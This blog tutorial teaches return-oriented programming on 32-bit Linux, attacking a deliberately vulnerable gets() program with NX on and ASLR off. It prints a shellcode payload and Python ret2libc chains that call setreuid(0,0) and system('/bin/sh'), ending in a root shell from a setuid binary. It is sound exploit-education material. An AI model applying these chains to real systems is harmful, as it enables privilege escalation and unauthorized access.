--- 
layout: post 
title:  "Stack Buffer Overflows: Linux 3 - Bypassing DEP with ROP" 
date:   2018-02-02 01:00:00 +0100 
categories: [bof] 
description: v0.1 
image: 
  feature: shellcode3.jpg 
  credit: 
  creditlink: 
  
--- 

In this chapter we'll be dealing with systems with ASLR disabled, and with all binary protections disabled bar NX.  Here you'll learn how to craft basic ROP chains using functions in libc, and how to chain multiples of these together.

#### Prior Reading:
-  [Chapter 1](https://reboare.github.io/bof/linux-stack-bof-1.html) 
-  [Chapter 2](https://reboare.github.io/bof/linux-stack-bof-2.html).  



#### Environment:
- Ubuntu 16.04 32bit
- GDB Peda

The code we'll be using is:
```c 
#include <stdio.h> 
int main(){ 
  bof(); 
  return 0; 
} 

int bof() { 
  char buffer[128]; 
  gets(buffer); 
  return 0; 
} 
```   

And the binary will be compiled as follows: 

```bash
root@ubuntu:/home/ubuntu/Desktop/bof3# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
root@ubuntu:/home/ubuntu/Desktop/bof3# gcc bof.c -o bof  -fno-stack-protector 
``` 

If you're running on 64-bit Linux, don't forget to set the `-m32` flag.  You'll notice here that we've dropped the `-z execstack` flag to gcc, which means that Data Execution Prevention, DEP or NX will be enabled, so we can no longer simply place shellcode on the stack and execute it.  As an example I'll show what happens when we attempt to execute shellcode we've placed on the stack.

DEP in Action
------------
We input our exploit which writes in our shellcode to be run:

```
python -c 'from struct import pack; print "\xeb\x34\x5e\x31\xc0\x31\xc9\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb1\x07\x80\x74\x0e\xff\x03\x80\xe9\x01\x75\xf6\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xc7\xff\xff\xff\x2c\x61\x6a\x6d\x2c\x70\x6b".rjust(140, "\x90")+pack("<L", 0xffffd5f8)' > /tmp/var
```

We input the buffer into our binary, but we're not greeted by the shell we expect:

![](https://preview.ibb.co/nyX6m6/bof.png)

As we can see we've hit our NOP sled as the next instructions to be executed are the nop instructions.  However, execution instantly segfaults.  As the DEP flag is set, this section of memory cannot contain executable instructions, therefore we can't jump back to our shellcode.  The methods we've learnt so far won't work, so let's dive into what happens to the stack.

The Stack under DEP
-------------------
We'll set a breakpoint in the code and look directly at the process maps to work out why this happens:
```bash 
root@ubuntu:/home/ubuntu/Desktop/bof3# cat /proc/9435/maps 
08048000-08049000 r-xp 00000000 08:01 1058       /home/ubuntu/Desktop/bof3/bof
08049000-0804a000 r--p 00000000 08:01 1058       /home/ubuntu/Desktop/bof3/bof
0804a000-0804b000 rw-p 00001000 08:01 1058       /home/ubuntu/Desktop/bof3/bof
0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
b7e09000-b7e0a000 rw-p 00000000 00:00 0  
b7e0a000-b7fba000 r-xp 00000000 08:01 934137     /lib/i386-linux-gnu/libc-2.23.so
b7fba000-b7fbc000 r--p 001af000 08:01 934137     /lib/i386-linux-gnu/libc-2.23.so
b7fbc000-b7fbd000 rw-p 001b1000 08:01 934137     /lib/i386-linux-gnu/libc-2.23.so
b7fbd000-b7fc0000 rw-p 00000000 00:00 0  
b7fd6000-b7fd7000 rw-p 00000000 00:00 0  
b7fd7000-b7fd9000 r--p 00000000 00:00 0          [vvar] 
b7fd9000-b7fdb000 r-xp 00000000 00:00 0          [vdso] 
b7fdb000-b7ffe000 r-xp 00000000 08:01 934000     /lib/i386-linux-gnu/ld-2.23.so
b7ffe000-b7fff000 r--p 00022000 08:01 934000     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 934000     /lib/i386-linux-gnu/ld-2.23.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
``` 

You'll see that the `[stack]` has the protections `rw-p` but no execute.  If we recompile with `-z execstack` and do the same you'll see the difference: 

``` 
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack] 
``` 

ROP In Theory
------------------
So jumping to shell-code on the stack is now impossible, but we still have control of the EIP register, and therefore we can control execution.  So rather than jumping to shell-code, why don't we just jump to some other function?

In fact we've done something similar to this in Example 2 of [Chapter 1](https://reboare.github.io/bof/linux-stack-bof-1.html).  By controlling EIP, we jumped to another function included within the binary.  Of course this was the simplest possible example, but we can do something very similar now, but instead of jumping to a function in the binary, we'll jump directly to a function in libc.

However, almost all libc functions will require arguments to execute.  There are 'magic' functions that will return you a shell, but in this instance, and most others, we're going to want to call a function such as `system` with some arguments.  

### Calling Conventions
**Note**: the following only applies to x86 (32-bit Intel/AMD) systems.  Different processors will have different calling conventions, and these themselves vary when stepping into the realm of 64-bit exploits.

To illustrate calling conventions we will be referencing the following code:
```c
#include <stdio.h> 
int main(){ 
	  printf("Hello Wor%id\n", 1); 
	  return 0; 
} 
```
We will also reference it's disassembly:
```gdb
Dump of assembler code for function main:
   0x0804840b <+0>:	lea    ecx,[esp+0x4]
   0x0804840f <+4>:	and    esp,0xfffffff0
   0x08048412 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048415 <+10>:	push   ebp
   0x08048416 <+11>:	mov    ebp,esp
   0x08048418 <+13>:	push   ecx
   0x08048419 <+14>:	sub    esp,0x4
   0x0804841c <+17>:	sub    esp,0x8
   0x0804841f <+20>:	push   0x1
   0x08048421 <+22>:	push   0x80484c0
   0x08048426 <+27>:	call   0x80482e0 <printf@plt>
   0x0804842b <+32>:	add    esp,0x10
   0x0804842e <+35>:	mov    eax,0x0
   0x08048433 <+40>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048436 <+43>:	leave  
   0x08048437 <+44>:	lea    esp,[ecx-0x4]
   0x0804843a <+47>:	ret    
End of assembler dump.
```
In this code all we do is call a function `printf` with a format string argument and an integer to be placed into the string.  If we run it, 'HelloWor1d' is printed.  So this is a very simple example of calling multiple arguments to a function.

Right before a function is called in ordinary execution, the set of arguments are pushed onto the stack.  We see this in the disassembly:
```
   0x0804841f <+20>:	push   0x1
   0x08048421 <+22>:	push   0x80484c0
   0x08048426 <+27>:	call   0x80482e0 <printf@plt>
```
They are pushed in reverse order in most cases, so once printf itself is called, the stack looks like the following:
```
0000| 0xffffd040 --> 0x80484c0 ("Hello Wor%id\n")
0004| 0xffffd044 --> 0x1 
0008| 0xffffd048 --> 0xffffd10c --> 0xffffd2ef ("XDG_VTNR=7")
0012| 0xffffd04c --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xf8])
```
This can vary from compiler to compiler so watch out but I'd be surprised if you found any different behaviour than the above.  So now if we call the function, what does the stack look like?  We move one instruction forward and we'll be at `0xf7e52020 <printf>:	call   0xf7f26289` which is the first instruction in printf.  The stack looks like this:
```
0000| 0xffffd03c --> 0x804842b (<main+32>:	add    esp,0x10)
0004| 0xffffd040 --> 0x80484c0 ("Hello Wor%id\n")
0008| 0xffffd044 --> 0x1 
0012| 0xffffd048 --> 0xffffd10c --> 0xffffd2ef ("XDG_VTNR=7")
0016| 0xffffd04c --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xf8])
```
We can see that `main+32` has been pushed onto the stack.  If we look back up at the disassembly this is the instruction directly following our call to `printf`.  This is the saved EIP and is pushed onto the stack when a function is called.  It is also the value we overwrite any time we do a buffer overflow.  Once this function exits, this value on the stack will be popped back into the EIP register so execution will resume back in our original function.

So now we have enough information to know what our stack looks like just before a function is called.  And if we make it look like below, can control what function is called and what function it returns to after:

![](https://image.ibb.co/ksSp8m/Untitled_Diagram.png)

Since we can overflow the buffer, we can write values to the stack after EIP.  With the knowledge we now have, we can craft our stack in such a way that we perform arbitrary actions regardless of DEP.

ret2libc
------
So looking at our mappings file, we first find the address of our libc library in virtual memory.  Remember that ASLR is disabled, so this will remain constant throughout executes.
``` 
b7e0a000-b7fba000 r-xp 00000000 08:01 934137     /lib/i386-linux-gnu/libc-2.23.so
``` 

We then need to find the offset of our required functions

``` 
root@ubuntu:/home/ubuntu/Desktop/bof3# readelf -s /lib/i386-linux-gnu/libc-2.23.so | grep system 
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0 
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE 
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0 
``` 
We'll want to cleanly exit once we're done, so we need to use the `exit` function:
``` 
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0 
```

We have our offsets from libc and our libc base address.  We now just need to a reference to the string '/bin/sh' to pass in as an argument.  We can do this in a few ways.  Either pass in our own custom string via the buffer and then reference that, or find the reference within libc:

```
ubuntu@ubuntu:~/Desktop/bof3$ strings -a -t x /lib/i386-linux-gnu/libc-2.23.so | grep /bin/sh
 15ba0b /bin/sh
```

So we have an offset for system, exit and our `/bin/sh` string.  Now we just need to construct our ROP chain from all this:

```python
import struct

libc_base = 0xb7e0a000
system = libc_base + 0x0003ada0
exit = libc_base + 0x0002e9d0
binsh_string = libc_base + 0x15ba0b

rop  = 'A'*140
rop += struct.pack('<L',system)
rop += struct.pack('<L',exit)
rop += struct.pack('<L', binsh_string)
print rop
```
Passing it into our setuid binary, and we're returned a shell:
```bash
ubuntu@ubuntu:~/Desktop/bof3$ (python bof.py; cat) | ./bof
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

You'll notice however that we aren't returned an escalated shell!  We're still running as user ubuntu despite running a setuid executable owned by root.  This comes down to effective-uid vs uid again. 

Chained ret2libc
-------------------
Sometimes it's not enough to just call one function, we'll have to chain multiple functions together to achieve our desired result.  We'll just use the `setreuid` function and then spawn a shell to set our effective uid, but then how do we call another function with arguments after?

Once our function is called we're returned to the next function we want to call, but we need to clear out the list of arguments to the last function if we want to call another one with arguments.  

Binaries contain a number of useful snippets of code, which end in a `ret` instruction.  We can use these to clear the stack and adjust it before calling another function.  These are known as gadgets, and we can use PEDA to dump some useful gadgets.

```
gdb-peda$ ropgadget
ret = 0x80482b2
popret = 0x80482c9
pop3ret = 0x80484b9
pop2ret = 0x80484ba
pop4ret = 0x80484b8
addesp_12 = 0x80482c6
addesp_16 = 0x8048375
 ```

`popret` instructions are simply a sequence of `pop` instructions followed by a `ret`.  Remember that pop instruction increment `esp` and therefore can be considered to be removing an item from the stack.  If we return into one of these gadgets it will adjust the stack pointer each time, removing the arguments we placed in prior, and then return into the next value we've placed on the stack.  

Putting this all together, if we call `setreuid` with two arguments, we can return into a `pop2ret` to remove those arguments, and then return into our `system("/bin/sh")`.  Let's grab our offset for setreuid:

```
ubuntu@ubuntu:~/Desktop/bof3$ readelf -s /lib/i386-linux-gnu/libc-2.23.so | grep setreuid
   480: 000df560   135 FUNC    WEAK   DEFAULT   13 setreuid@@GLIBC_2.0
```

Now put this all together calling `setreuid(0,0)` followed by `/bin/sh`:

```python
import struct

libc_base = 0xb7e0a000
system = libc_base + 0x0003ada0
exit = libc_base + 0x0002e9d0
binsh_string = libc_base + 0x15ba0b
setreuid = libc_base + 0x000df560
pop2ret = 0x80484ba

rop  = 'A'*140
rop += struct.pack('<L', setreuid)
rop += struct.pack('<L', pop2ret)
rop += struct.pack('<L', 0)
rop += struct.pack('<L', 0)
rop += struct.pack('<L',system)
rop += struct.pack('<L',exit)
rop += struct.pack('<L', binsh_string)
print rop
```

```
ubuntu@ubuntu:~/Desktop/bof3$ (python bof_setuid.py; cat) | ./bof
id
uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
We're returned a root shell!

ret2mprotect 
--------------
I won't go over this too much, as I've already covered it fairly well in my [Calamity Writeup]().  The long and short of it is we can disable DEP entirely and run arbitrary shell-code in that manner.  We use the `mprotect` function in libc to make our stack executable, and then jump to it as before.  Read the write-up if you're curious about this method.

Conclusion
--------------
 Next time I'll cover how this falls apart if ASLR is enabled, and I will go over the ways this protection can also be bypassed using similar techniques.  If there's anything you'd like me to cover or any mistakes I've made, I'm more than happy for any feedback!
 
References  & Further Reading
-------------- 
[0x00sec Exploit Mitigation Techniques - Data Execution Prevention](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)  
[The Stack Frame](http://www.cs.uwm.edu/classes/cs315/Bacon/Lecture/HTML/ch10s07.html)  
[Exploiting Environment Variables](http://techblog.rosedu.org/exploiting-environment-variables.html)  
[HackTheBox - October](https://reboare.github.io/hackthebox/htb-october.html)  
[HackTheBox - Calamity](https://reboare.github.io/hackthebox/calamity.html)  
